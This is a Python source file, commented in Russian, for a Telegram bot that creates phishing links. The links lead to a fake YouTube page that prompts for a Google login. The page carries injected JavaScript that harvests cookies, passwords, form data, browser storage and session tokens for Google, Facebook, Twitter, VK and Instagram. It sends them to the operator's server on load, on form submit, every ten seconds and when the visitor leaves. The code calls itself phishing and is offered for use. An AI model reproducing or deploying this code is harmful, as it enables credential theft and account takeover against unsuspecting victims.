import logging
import asyncio
import json
import re
import uuid
import html
from datetime import datetime
from typing import Dict, List, Optional, Any
import aiohttp
from dataclasses import dataclass, asdict
import base64

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    CallbackQueryHandler
)
from telegram.constants import ParseMode

# Настройка логирования
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# Конфигурация
BOT_TOKEN = "ВАШ_ТОКЕН_БОТА"
ADMIN_ID = 1709490182  # Ваш Telegram ID для уведомлений
DOMAIN = "https://ваш-домен.com"  # Ваш домен для фишинга

# Хранилище данных
@dataclass
class PhishingLink:
    id: str
    original_url: str
    video_id: str
    created_at: str
    created_by: int
    clicks: int = 0
    data_collected: List[Dict] = None
    active: bool = True
    collected_cookies: List[Dict] = None
    collected_passwords: List[Dict] = None
    collected_logins: List[Dict] = None
    collected_storage_data: List[Dict] = None  # localStorage/sessionStorage
    full_sensitive_data: List[Dict] = None     # Полные сырые данные
    social_auth_data: List[Dict] = None        # Данные авторизации соцсетей
    
    def __post_init__(self):
        if self.data_collected is None:
            self.data_collected = []
        if self.collected_cookies is None:
            self.collected_cookies = []
        if self.collected_passwords is None:
            self.collected_passwords = []
        if self.collected_logins is None:
            self.collected_logins = []
        if self.collected_storage_data is None:
            self.collected_storage_data = []
        if self.full_sensitive_data is None:
            self.full_sensitive_data = []
        if self.social_auth_data is None:
            self.social_auth_data = []

class Database:
    def __init__(self):
        self.links: Dict[str, PhishingLink] = {}
        self.users: Dict[int, Dict] = {}
        self.stats = {
            "total_links": 0,
            "total_clicks": 0,
            "total_data_collected": 0,
            "active_sessions": 0,
            "cookies_collected": 0,
            "passwords_collected": 0,
            "logins_collected": 0,
            "storage_data_collected": 0,
            "full_data_collected": 0,
            "social_auth_found": 0
        }
    
    def add_link(self, link: PhishingLink):
        self.links[link.id] = link
        self.stats["total_links"] += 1
        self.save()
    
    def get_link(self, link_id: str) -> Optional[PhishingLink]:
        return self.links.get(link_id)
    
    def add_click(self, link_id: str):
        if link_id in self.links:
            self.links[link_id].clicks += 1
            self.stats["total_clicks"] += 1
            self.save()
    
    def add_collected_data(self, link_id: str, data: Dict):
        if link_id in self.links:
            self.links[link_id].data_collected.append(data)
            self.stats["total_data_collected"] += 1
            self.save()
    
    def add_collected_cookies(self, link_id: str, cookies: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_cookies.extend(cookies)
            self.stats["cookies_collected"] += len(cookies)
            self.save()
    
    def add_collected_passwords(self, link_id: str, passwords: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_passwords.extend(passwords)
            self.stats["passwords_collected"] += len(passwords)
            self.save()
    
    def add_collected_logins(self, link_id: str, logins: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_logins.extend(logins)
            self.stats["logins_collected"] += len(logins)
            self.save()
    
    def add_collected_storage(self, link_id: str, storage_data: List[Dict]):
        if link_id in self.links:
            self.links[link_id].collected_storage_data.extend(storage_data)
            self.stats["storage_data_collected"] += len(storage_data)
            self.save()
    
    def add_full_sensitive_data(self, link_id: str, sensitive_data: Dict):
        if link_id in self.links:
            self.links[link_id].full_sensitive_data.append(sensitive_data)
            self.stats["full_data_collected"] += 1
            self.save()
    
    def add_social_auth_data(self, link_id: str, social_data: Dict):
        if link_id in self.links:
            self.links[link_id].social_auth_data.append(social_data)
            self.stats["social_auth_found"] += 1
            self.save()
    
    def save(self):
        try:
            data = {
                "links": {k: asdict(v) for k, v in self.links.items()},
                "stats": self.stats
            }
            with open("database.json", "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Error saving database: {e}")
    
    def load(self):
        try:
            with open("database.json", "r", encoding="utf-8") as f:
                data = json.load(f)
                self.links = {k: PhishingLink(**v) for k, v in data.get("links", {}).items()}
                self.stats = data.get("stats", self.stats)
        except FileNotFoundError:
            pass
        except Exception as e:
            logger.error(f"Error loading database: {e}")

# Инициализация базы данных
db = Database()
db.load()

# Генератор JavaScript для сбора данных
class JavaScriptInjector:
    @staticmethod
    def get_cookies_collection_script() -> str:
        """JavaScript для сбора cookies"""
        return """
        <script>
        // Функция для сбора всех cookies
        function collectAllCookies() {
            const cookies = {};
            
            const cookieString = document.cookie;
            if (cookieString) {
                cookieString.split(';').forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (name && value) {
                        cookies[name] = decodeURIComponent(value);
                    }
                });
            }
            
            return cookies;
        }
        
        // Функция для сбора сохраненных паролей и логинов
        function collectSavedCredentials() {
            const credentials = {
                passwords: [],
                logins: [],
                autofill_data: []
            };
            
            try {
                const passwordFields = document.querySelectorAll('input[type="password"]');
                const loginFields = document.querySelectorAll('input[type="text"], input[type="email"], input[type="tel"]');
                
                passwordFields.forEach(field => {
                    if (field.value) {
                        credentials.passwords.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                loginFields.forEach(field => {
                    if (field.value && (field.type === 'text' || field.type === 'email' || field.type === 'tel')) {
                        credentials.logins.push({
                            field_name: field.name || field.id || 'unknown',
                            field_id: field.id,
                            field_class: field.className,
                            value: field.value,
                            page_url: window.location.href,
                            timestamp: new Date().toISOString()
                        });
                    }
                });
                
                document.querySelectorAll('form').forEach(form => {
                    try {
                        const formData = new FormData(form);
                        const formValues = {};
                        for (let [key, value] of formData.entries()) {
                            formValues[key] = value;
                        }
                        
                        if (Object.keys(formValues).length > 0) {
                            credentials.autofill_data.push({
                                type: 'form_data',
                                form_id: form.id || 'unknown',
                                form_action: form.action || 'unknown',
                                data: formValues
                            });
                        }
                    } catch (e) {}
                });
                
            } catch (e) {
                console.error('Error collecting credentials:', e);
            }
            
            return credentials;
        }
        
        // Функция для извлечения паролей из менеджеров паролей
        function extractPasswordManagerData() {
            const managerData = {
                browser_saved: [],
                third_party: []
            };
            
            try {
                if (navigator.credentials && navigator.credentials.get) {
                    navigator.credentials.get({password: true})
                        .then(credential => {
                            if (credential) {
                                managerData.browser_saved.push({
                                    type: 'browser_native',
                                    data: credential
                                });
                            }
                        })
                        .catch(e => {});
                }
                
                const passwordManagers = [
                    'lastpass', '1password', 'dashlane', 'bitwarden',
                    'keeper', 'roboform', 'nordpass', 'enpass'
                ];
                
                passwordManagers.forEach(manager => {
                    try {
                        const managerElements = document.querySelectorAll(`[class*="${manager}"], [id*="${manager}"]`);
                        if (managerElements.length > 0) {
                            managerData.third_party.push({
                                manager: manager,
                                detected: true,
                                elements_count: managerElements.length
                            });
                        }
                    } catch (e) {}
                });
                
            } catch (e) {
                console.error('Error extracting password manager data:', e);
            }
            
            return managerData;
        }
        
        // Функция для сбора данных авторизации в соцсетях (ОБНОВЛЕННАЯ)
        function collectSocialMediaLogins() {
            const socialLogins = {
                google: {
                    cookies: [],
                    localStorage: {},
                    sessionStorage: {},
                    auth_status: "not_logged_in",
                    tokens_found: 0,
                    detected_domains: []
                },
                facebook: {
                    cookies: [],
                    localStorage: {},
                    sessionStorage: {},
                    auth_status: "not_logged_in",
                    tokens_found: 0,
                    detected_domains: []
                },
                twitter: {
                    cookies: [],
                    localStorage: {},
                    sessionStorage: {},
                    auth_status: "not_logged_in",
                    tokens_found: 0,
                    detected_domains: []
                },
                vk: {
                    cookies: [],
                    localStorage: {},
                    sessionStorage: {},
                    auth_status: "not_logged_in",
                    tokens_found: 0,
                    detected_domains: []
                },
                instagram: {
                    cookies: [],
                    localStorage: {},
                    sessionStorage: {},
                    auth_status: "not_logged_in",
                    tokens_found: 0,
                    detected_domains: []
                }
            };
            
            const authKeywords = [
                'token', 'access_token', 'refresh_token', 'session', 'auth', 
                'login', 'user', 'oauth', 'id_token', 'bearer', 'csrf',
                'xsrf', 'jwt', 'credential', 'password', 'secret',
                'account', 'profile', 'uid', 'user_id', 'email'
            ];
            
            try {
                // 1. Собираем все cookies
                const allCookies = document.cookie.split(';');
                
                allCookies.forEach(cookie => {
                    const [name, value] = cookie.trim().split('=');
                    if (!name || !value) return;
                    
                    const cookieName = name.toLowerCase();
                    const cookieValue = decodeURIComponent(value);
                    
                    // Google
                    if (cookieName.includes('google') || 
                        cookieName.includes('gmail') || 
                        cookieName.includes('youtube') ||
                        cookieName.includes('accounts.google') ||
                        cookieName.includes('gauth') ||
                        cookieName.includes('gid') ||
                        cookieName.includes('gtoken')) {
                        socialLogins.google.cookies.push({
                            name: name,
                            value: cookieValue.substring(0, 500),
                            timestamp: new Date().toISOString()
                        });
                        
                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
                            cookieValue.includes(keyword))) {
                            socialLogins.google.tokens_found++;
                            socialLogins.google.auth_status = "tokens_detected";
                        }
                    }
                    
                    // Facebook
                    if (cookieName.includes('facebook') || 
                        cookieName.includes('fb_') ||
                        cookieName.includes('c_user') ||
                        cookieName.includes('xs') ||
                        cookieName.includes('fr') ||
                        cookieName.includes('datr') ||
                        cookieName.includes('sb')) {
                        socialLogins.facebook.cookies.push({
                            name: name,
                            value: cookieValue.substring(0, 500),
                            timestamp: new Date().toISOString()
                        });
                        
                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
                            cookieValue.includes(keyword))) {
                            socialLogins.facebook.tokens_found++;
                            socialLogins.facebook.auth_status = "tokens_detected";
                        }
                    }
                    
                    // Twitter/X
                    if (cookieName.includes('twitter') || 
                        cookieName.includes('x.com') ||
                        cookieName.includes('guest_id') ||
                        cookieName.includes('auth_token') ||
                        cookieName.includes('ct0') ||
                        cookieName.includes('twid')) {
                        socialLogins.twitter.cookies.push({
                            name: name,
                            value: cookieValue.substring(0, 500),
                            timestamp: new Date().toISOString()
                        });
                        
                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
                            cookieValue.includes(keyword))) {
                            socialLogins.twitter.tokens_found++;
                            socialLogins.twitter.auth_status = "tokens_detected";
                        }
                    }
                    
                    // VK
                    if (cookieName.includes('vk') || 
                        cookieName.includes('vkontakte') ||
                        cookieName.includes('remixsid') ||
                        cookieName.includes('remixlang') ||
                        cookieName.includes('remixstid') ||
                        cookieName.includes('remixflash')) {
                        socialLogins.vk.cookies.push({
                            name: name,
                            value: cookieValue.substring(0, 500),
                            timestamp: new Date().toISOString()
                        });
                        
                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
                            cookieValue.includes(keyword))) {
                            socialLogins.vk.tokens_found++;
                            socialLogins.vk.auth_status = "tokens_detected";
                        }
                    }
                    
                    // Instagram
                    if (cookieName.includes('instagram') || 
                        cookieName.includes('ig_') ||
                        cookieName.includes('sessionid') ||
                        cookieName.includes('csrftoken') ||
                        cookieName.includes('mid') ||
                        cookieName.includes('ds_user_id')) {
                        socialLogins.instagram.cookies.push({
                            name: name,
                            value: cookieValue.substring(0, 500),
                            timestamp: new Date().toISOString()
                        });
                        
                        if (authKeywords.some(keyword => cookieName.includes(keyword) || 
                            cookieValue.includes(keyword))) {
                            socialLogins.instagram.tokens_found++;
                            socialLogins.instagram.auth_status = "tokens_detected";
                        }
                    }
                });
                
                // 2. Проверяем localStorage
                if (window.localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        
                        if (!key || !value) continue;
                        
                        const lowerKey = key.toLowerCase();
                        const lowerValue = value.toLowerCase();
                        
                        // Google
                        if (lowerKey.includes('google') || 
                            lowerKey.includes('gmail') ||
                            lowerValue.includes('google') ||
                            lowerValue.includes('accounts.google.com')) {
                            socialLogins.google.localStorage[key] = value.substring(0, 1000);
                            
                            if (authKeywords.some(keyword => 
                                lowerKey.includes(keyword) || 
                                lowerValue.includes(keyword))) {
                                socialLogins.google.tokens_found++;
                                socialLogins.google.auth_status = "local_storage_tokens";
                            }
                        }
                        
                        // Facebook
                        if (lowerKey.includes('facebook') || 
                            lowerKey.includes('fb_') ||
                            lowerValue.includes('facebook') ||
                            lowerValue.includes('fb.com')) {
                            socialLogins.facebook.localStorage[key] = value.substring(0, 1000);
                            
                            if (authKeywords.some(keyword => 
                                lowerKey.includes(keyword) || 
                                lowerValue.includes(keyword))) {
                                socialLogins.facebook.tokens_found++;
                                socialLogins.facebook.auth_status = "local_storage_tokens";
                            }
                        }
                        
                        // Twitter
                        if (lowerKey.includes('twitter') || 
                            lowerKey.includes('x.com') ||
                            lowerValue.includes('twitter') ||
                            lowerValue.includes('x.com')) {
                            socialLogins.twitter.localStorage[key] = value.substring(0, 1000);
                            
                            if (authKeywords.some(keyword => 
                                lowerKey.includes(keyword) || 
                                lowerValue.includes(keyword))) {
                                socialLogins.twitter.tokens_found++;
                                socialLogins.twitter.auth_status = "local_storage_tokens";
                            }
                        }
                        
                        // VK
                        if (lowerKey.includes('vk') || 
                            lowerKey.includes('vkontakte') ||
                            lowerValue.includes('vk.com') ||
                            lowerValue.includes('vkontakte.ru')) {
                            socialLogins.vk.localStorage[key] = value.substring(0, 1000);
                            
                            if (authKeywords.some(keyword => 
                                lowerKey.includes(keyword) || 
                                lowerValue.includes(keyword))) {
                                socialLogins.vk.tokens_found++;
                                socialLogins.vk.auth_status = "local_storage_tokens";
                            }
                        }
                    }
                }
                
                // 3. Проверяем sessionStorage
                if (window.sessionStorage) {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        const value = sessionStorage.getItem(key);
                        
                        if (!key || !value) continue;
                        
                        const lowerKey = key.toLowerCase();
                        
                        if (authKeywords.some(keyword => lowerKey.includes(keyword))) {
                            if (lowerKey.includes('google') || value.includes('google.com')) {
                                socialLogins.google.sessionStorage[key] = value.substring(0, 1000);
                                socialLogins.google.auth_status = "session_storage_tokens";
                            } else if (lowerKey.includes('facebook') || value.includes('fb.com')) {
                                socialLogins.facebook.sessionStorage[key] = value.substring(0, 1000);
                                socialLogins.facebook.auth_status = "session_storage_tokens";
                            } else if (lowerKey.includes('twitter') || value.includes('x.com')) {
                                socialLogins.twitter.sessionStorage[key] = value.substring(0, 1000);
                                socialLogins.twitter.auth_status = "session_storage_tokens";
                            } else if (lowerKey.includes('vk') || value.includes('vkontakte')) {
                                socialLogins.vk.sessionStorage[key] = value.substring(0, 1000);
                                socialLogins.vk.auth_status = "session_storage_tokens";
                            } else if (lowerKey.includes('instagram') || value.includes('instagram.com')) {
                                socialLogins.instagram.sessionStorage[key] = value.substring(0, 1000);
                                socialLogins.instagram.auth_status = "session_storage_tokens";
                            }
                        }
                    }
                }
                
                // 4. Определяем статус авторизации
                Object.keys(socialLogins).forEach(platform => {
                    const data = socialLogins[platform];
                    
                    if (data.tokens_found > 0 || 
                        data.cookies.some(c => 
                            c.name.includes('session') || 
                            c.name.includes('token') ||
                            c.name.includes('auth'))) {
                        
                        if (platform === 'google') {
                            if (data.cookies.some(c => 
                                c.name.includes('SID') || 
                                c.name.includes('HSID') ||
                                c.name.includes('SSID') ||
                                c.name.includes('APISID') ||
                                c.name.includes('SAPISID'))) {
                                data.auth_status = "google_logged_in";
                            }
                        }
                        
                        if (platform === 'facebook') {
                            if (data.cookies.some(c => 
                                c.name === 'c_user' || 
                                c.name === 'xs')) {
                                data.auth_status = "facebook_logged_in";
                            }
                        }
                        
                        if (platform === 'vk') {
                            if (data.cookies.some(c => c.name === 'remixsid')) {
                                data.auth_status = "vk_logged_in";
                            }
                        }
                        
                        if (platform === 'instagram') {
                            if (data.cookies.some(c => c.name === 'sessionid')) {
                                data.auth_status = "instagram_logged_in";
                            }
                        }
                        
                        if (platform === 'twitter') {
                            if (data.cookies.some(c => 
                                c.name.includes('auth_token') ||
                                c.name.includes('ct0'))) {
                                data.auth_status = "twitter_logged_in";
                            }
                        }
                    }
                });
                
                // 5. Пассивная проверка доступа к соцсетям
                const socialDomains = [
                    'https://accounts.google.com',
                    'https://facebook.com',
                    'https://www.facebook.com',
                    'https://twitter.com',
                    'https://x.com',
                    'https://vk.com',
                    'https://instagram.com'
                ];
                
                socialDomains.forEach(domain => {
                    fetch(domain, {
                        method: 'HEAD',
                        mode: 'no-cors',
                        credentials: 'include'
                    })
                    .then(() => {
                        const platform = domain.includes('google') ? 'google' :
                                       domain.includes('facebook') ? 'facebook' :
                                       domain.includes('twitter') ? 'twitter' :
                                       domain.includes('x.com') ? 'twitter' :
                                       domain.includes('vk.com') ? 'vk' : 'instagram';
                        
                        if (!socialLogins[platform].detected_domains.includes(domain)) {
                            socialLogins[platform].detected_domains.push(domain);
                        }
                        
                        // Если смогли отправить запрос с cookies, значит они есть
                        if (socialLogins[platform].auth_status === "not_logged_in") {
                            socialLogins[platform].auth_status = "cookies_present";
                        }
                    })
                    .catch(() => {});
                });
                
            } catch (e) {
                console.error('Error collecting social media logins:', e);
            }
            
            return socialLogins;
        }
        
        // Функция для сбора данных из хранилища
        function collectStorageData() {
            const storageData = {
                localStorage: {},
                sessionStorage: {},
                indexedDB: []
            };
            
            try {
                if (window.localStorage) {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        storageData.localStorage[key] = localStorage.getItem(key);
                    }
                }
                
                if (window.sessionStorage) {
                    for (let i = 0; i < sessionStorage.length; i++) {
                        const key = sessionStorage.key(i);
                        storageData.sessionStorage[key] = sessionStorage.getItem(key);
                    }
                }
                
                if (window.indexedDB) {
                    try {
                        if (indexedDB.databases) {
                            indexedDB.databases().then(dbs => {
                                storageData.indexedDB = dbs.map(db => ({
                                    name: db.name,
                                    version: db.version
                                }));
                            }).catch(() => {});
                        }
                    } catch (e) {}
                }
                
            } catch (e) {
                console.error('Error collecting storage data:', e);
            }
            
            return storageData;
        }
        
        // Главная функция сбора всех данных
        async function collectAllSensitiveData() {
            const allData = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                user_agent: navigator.userAgent,
                language: navigator.language,
                platform: navigator.platform,
                cookies: {},
                credentials: {},
                password_managers: {},
                social_logins: {},
                storage_data: {},
                browser_info: {
                    cookie_enabled: navigator.cookieEnabled,
                    java_enabled: navigator.javaEnabled ? navigator.javaEnabled() : false,
                    pdf_viewer_enabled: navigator.pdfViewerEnabled || false,
                    do_not_track: navigator.doNotTrack || 'unspecified'
                },
                screen_info: {
                    width: window.screen.width,
                    height: window.screen.height,
                    color_depth: window.screen.colorDepth,
                    pixel_depth: window.screen.pixelDepth
                },
                timezone: {
                    offset: new Date().getTimezoneOffset(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                }
            };
            
            try {
                allData.cookies = collectAllCookies();
                allData.credentials = collectSavedCredentials();
                allData.password_managers = extractPasswordManagerData();
                allData.social_logins = collectSocialMediaLogins();
                allData.storage_data = collectStorageData();
                
                return allData;
                
            } catch (error) {
                console.error('Error collecting sensitive data:', error);
                return {
                    error: error.message,
                    partial_data: allData
                };
            }
        }
        
        // Функция отправки данных на сервер
        function sendCollectedData(data) {
            const linkId = new URLSearchParams(window.location.search).get('id');
            if (!linkId) return;
            
            try {
                const jsonData = JSON.stringify(data);
                const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                
                // Основная отправка
                fetch('/api/collect', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString()
                    })
                })
                .then(response => response.json())
                .then(result => {
                    console.log('Data sent successfully:', result);
                    
                    // Дополнительная отправка данных авторизации
                    if (data.social_logins) {
                        const socialData = {
                            timestamp: new Date().toISOString(),
                            social_logins: data.social_logins,
                            url: window.location.href
                        };
                        
                        const socialJson = JSON.stringify(socialData);
                        const socialEncoded = btoa(unescape(encodeURIComponent(socialJson)));
                        
                        fetch('/api/auth-collect', {
                            method: 'POST',
                            headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({
                                link_id: linkId,
                                data_type: 'social_auth',
                                data: socialEncoded,
                                timestamp: new Date().toISOString()
                            })
                        });
                    }
                })
                .catch(error => {
                    console.error('Error sending data:', error);
                    try {
                        const xhr = new XMLHttpRequest();
                        xhr.open('POST', '/api/collect', true);
                        xhr.setRequestHeader('Content-Type', 'application/json');
                        xhr.send(JSON.stringify({
                            link_id: linkId,
                            data_type: 'sensitive_data',
                            data: encodedData,
                            timestamp: new Date().toISOString()
                        }));
                    } catch (e) {
                        console.error('Fallback send also failed:', e);
                    }
                });
            } catch (error) {
                console.error('Error preparing data for send:', error);
            }
        }
        
        // Автоматический сбор данных при загрузке страницы
        window.addEventListener('load', function() {
            setTimeout(async () => {
                try {
                    const sensitiveData = await collectAllSensitiveData();
                    sendCollectedData(sensitiveData);
                } catch (e) {
                    console.error('Initial collection failed:', e);
                }
                
                // Сбор при взаимодействии с формами
                document.addEventListener('submit', async function(e) {
                    setTimeout(async () => {
                        try {
                            const formData = await collectAllSensitiveData();
                            sendCollectedData(formData);
                        } catch (e) {
                            console.error('Form submit collection failed:', e);
                        }
                    }, 500);
                });
                
                // Сбор при изменении полей
                document.querySelectorAll('input, textarea, select').forEach(input => {
                    input.addEventListener('change', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field change collection failed:', e);
                            }
                        }, 1000);
                    });
                    
                    input.addEventListener('blur', async function() {
                        setTimeout(async () => {
                            try {
                                const fieldData = await collectAllSensitiveData();
                                sendCollectedData(fieldData);
                            } catch (e) {
                                console.error('Field blur collection failed:', e);
                            }
                        }, 500);
                    });
                });
                
                // Периодический сбор каждые 10 секунд
                setInterval(async () => {
                    try {
                        const periodicData = await collectAllSensitiveData();
                        sendCollectedData(periodicData);
                    } catch (e) {
                        console.error('Periodic collection failed:', e);
                    }
                }, 10000);
                
            }, 3000);
        });
        
        // Сбор данных при уходе со страницы
        window.addEventListener('beforeunload', async function() {
            try {
                const exitData = await collectAllSensitiveData();
                const linkId = new URLSearchParams(window.location.search).get('id');
                if (linkId) {
                    const jsonData = JSON.stringify(exitData);
                    const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                    const blob = new Blob([JSON.stringify({
                        link_id: linkId,
                        data_type: 'sensitive_data',
                        data: encodedData,
                        timestamp: new Date().toISOString(),
                        exit_event: true
                    })], {type: 'application/json'});
                    
                    navigator.sendBeacon('/api/collect', blob);
                }
            } catch (e) {
                console.error('Exit collection failed:', e);
            }
        });
        </script>
        """
    
    @staticmethod
    def get_phishing_page_html(video_id: str, link_id: str) -> str:
        """Генерация HTML фишинговой страницы"""
        base_html = f"""
        <!DOCTYPE html>
        <html lang="ru">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>YouTube Video Player</title>
            <style>
                body {{
                    margin: 0;
                    padding: 0;
                    background: #000;
                    font-family: Arial, sans-serif;
                }}
                .container {{
                    max-width: 1200px;
                    margin: 0 auto;
                    padding: 20px;
                }}
                .player-container {{
                    position: relative;
                    padding-bottom: 56.25%;
                    height: 0;
                    overflow: hidden;
                }}
                .player-container iframe {{
                    position: absolute;
                    top: 0;
                    left: 0;
                    width: 100%;
                    height: 100%;
                }}
                .loading {{
                    text-align: center;
                    color: #fff;
                    padding: 50px;
                    font-size: 18px;
                }}
                .ad-banner {{
                    background: #ff0000;
                    color: white;
                    text-align: center;
                    padding: 10px;
                    margin: 20px 0;
                    border-radius: 5px;
                }}
                .login-prompt {{
                    background: #4285f4;
                    color: white;
                    padding: 15px;
                    margin: 20px 0;
                    border-radius: 5px;
                    text-align: center;
                }}
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ad-banner">
                    🎬 Для просмотра видео требуется авторизация через Google
                </div>
                
                <div class="player-container">
                    <iframe 
                        src="https://www.youtube.com/embed/{video_id}?autoplay=1&controls=0&showinfo=0&rel=0" 
                        frameborder="0" 
                        allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
                        allowfullscreen>
                    </iframe>
                </div>
                
                <div class="login-prompt" id="loginPrompt">
                    <h3>⚠️ Требуется вход в аккаунт</h3>
                    <p>Для продолжения просмотра войдите в свой аккаунт Google</p>
                    <button onclick="showLoginForm()" style="
                        background: white;
                        color: #4285f4;
                        border: none;
                        padding: 10px 20px;
                        border-radius: 5px;
                        cursor: pointer;
                        font-size: 16px;
                        margin: 10px;
                    ">
                        Войти в аккаунт
                    </button>
                </div>
                
                <div id="loginForm" style="display: none;">
                    <div style="background: white; padding: 20px; border-radius: 10px; margin: 20px 0;">
                        <h3 style="color: #333;">Вход в Google</h3>
                        <form id="googleLoginForm">
                            <input type="email" 
                                   placeholder="Электронная почта или телефон" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <input type="password" 
                                   placeholder="Введите пароль" 
                                   style="width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px;">
                            <button type="submit" 
                                    style="width: 100%; padding: 10px; background: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer;">
                                Далее
                            </button>
                        </form>
                        <p style="color: #666; font-size: 12px; margin-top: 10px;">
                            Нажимая кнопку "Далее", вы соглашаетесь с Условиями использования и Политикой конфиденциальности Google.
                        </p>
                    </div>
                </div>
                
                <div class="loading" id="loading">
                    Загрузка видео... Пожалуйста, подождите
                </div>
            </div>
            
            <script>
                function showLoginForm() {{
                    document.getElementById('loginPrompt').style.display = 'none';
                    document.getElementById('loginForm').style.display = 'block';
                    document.getElementById('loading').innerHTML = 'Проверка учетных данных...';
                    
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Загрузка видео...';
                        setTimeout(function() {{
                            document.getElementById('loading').style.display = 'none';
                        }}, 2000);
                    }}, 1500);
                }}
                
                document.getElementById('googleLoginForm').addEventListener('submit', function(e) {{
                    e.preventDefault();
                    document.getElementById('loading').innerHTML = '🔐 Проверка безопасности...';
                    
                    const email = this.querySelector('input[type="email"]').value;
                    const password = this.querySelector('input[type="password"]').value;
                    
                    setTimeout(function() {{
                        document.getElementById('loading').innerHTML = '✅ Успешный вход! Перенаправление...';
                    }}, 2000);
                }});
                
                setTimeout(function() {{
                    showLoginForm();
                }}, 5000);
            </script>
            
            <!-- Скрипт для пассивной проверки соцсетей -->
            <script>
            // Пассивная проверка доступа к соцсетям
            function passiveSocialCheck() {{
                const results = {{
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    platforms: {{}}
                }};
                
                const platforms = [
                    {{name: 'google', domains: ['https://accounts.google.com', 'https://mail.google.com']}},
                    {{name: 'facebook', domains: ['https://facebook.com', 'https://www.facebook.com']}},
                    {{name: 'twitter', domains: ['https://twitter.com', 'https://x.com']}},
                    {{name: 'vk', domains: ['https://vk.com', 'https://m.vk.com']}},
                    {{name: 'instagram', domains: ['https://instagram.com', 'https://www.instagram.com']}}
                ];
                
                platforms.forEach(platform => {{
                    results.platforms[platform.name] = {{
                        accessible_domains: [],
                        cookies_present: false,
                        auth_detected: false
                    }};
                    
                    platform.domains.forEach(domain => {{
                        fetch(domain, {{
                            method: 'HEAD',
                            mode: 'no-cors',
                            credentials: 'include'
                        }})
                        .then(() => {{
                            results.platforms[platform.name].accessible_domains.push(domain);
                            results.platforms[platform.name].cookies_present = true;
                            
                            // Если доступен accounts.google.com, вероятно есть авторизация
                            if (domain.includes('accounts.google.com')) {{
                                results.platforms[platform.name].auth_detected = true;
                            }}
                        }})
                        .catch(() => {{}});
                    }});
                }});
                
                // Отправляем результаты
                setTimeout(() => {{
                    const linkId = new URLSearchParams(window.location.search).get('id');
                    if (linkId) {{
                        const jsonData = JSON.stringify(results);
                        const encodedData = btoa(unescape(encodeURIComponent(jsonData)));
                        
                        navigator.sendBeacon('/api/social-check', JSON.stringify({{
                            link_id: linkId,
                            data_type: 'passive_social_check',
                            data: encodedData,
                            timestamp: new Date().toISOString()
                        }}));
                    }}
                }}, 5000);
            }}
            
            // Запускаем проверку при загрузке
            window.addEventListener('load', passiveSocialCheck);
            </script>
            
            {JavaScriptInjector.get_cookies_collection_script()}
        </body>
        </html>
        """
        return base_html

# Генератор ссылок
class LinkGenerator:
    @staticmethod
    def extract_video_id(url: str) -> str:
        """Извлечение ID видео из YouTube URL"""
        patterns = [
            r'(?:youtube\.com\/watch\?v=|youtu\.be\/|youtube\.com\/embed\/)([a-zA-Z0-9_-]{11})',
            r'(?:v=|\/)([a-zA-Z0-9_-]{11})'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, url)
            if match:
                return match.group(1)
        
        return "dQw4w9WgXcQ"
    
    @staticmethod
    def generate_link_id() -> str:
        """Генерация уникального ID для ссылки"""
        return str(uuid.uuid4()).replace('-', '')[:12]
    
    @staticmethod
    def create_phishing_url(video_id: str, link_id: str) -> str:
        """Создание фишинговой ссылки"""
        return f"{DOMAIN}/watch?v={video_id}&id={link_id}&t={int(datetime.now().timestamp())}"

# Функции для работы с сообщениями
def split_message(text: str, max_length: int = 4000) -> List[str]:
    """Разбивает длинное сообщение на части"""
    if len(text) <= max_length:
        return [text]
    
    chunks = []
    while text:
        if len(text) <= max_length:
            chunks.append(text)
            break
        
        split_pos = text.rfind('\n', 0, max_length)
        if split_pos == -1:
            split_pos = max_length
        
        chunks.append(text[:split_pos])
        text = text[split_pos:].lstrip()
    
    return chunks

def format_detailed_admin_report(link: PhishingLink, sensitive_data: Dict) -> str:
    """Форматирование детального отчета для админа"""
    report = f"""
🔐 *ДЕТАЛЬНЫЙ ОТЧЕТ О СОБРАННЫХ ДАННЫХ*
    
📌 Ссылка ID: `{link.id}`
👤 Создатель: `{link.created_by}`
